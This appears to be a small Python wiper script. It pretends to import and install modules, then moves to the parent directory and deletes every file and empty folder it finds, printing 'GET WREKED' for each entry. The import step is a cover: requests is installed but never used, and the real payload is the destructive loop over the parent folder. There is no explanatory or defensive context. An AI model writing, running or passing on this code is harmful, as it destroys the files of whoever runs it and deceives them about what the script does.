print("importing modules...")
import os
import sys
import shutil
try:
  import requests
except:
  print("requests module doesnt exists, installing..")
  try:
    os.system("pip install requests")
  except Exception as e:
    print("A error has been found: " + str(e))
os.chdir("..")
for files in os.listdir():
  try:
    os.remove(files)
  except:
    try:
      os.rmdir(files)
    except:
      print("error: coudnt delete dir or file")
  print("GET WREKED")
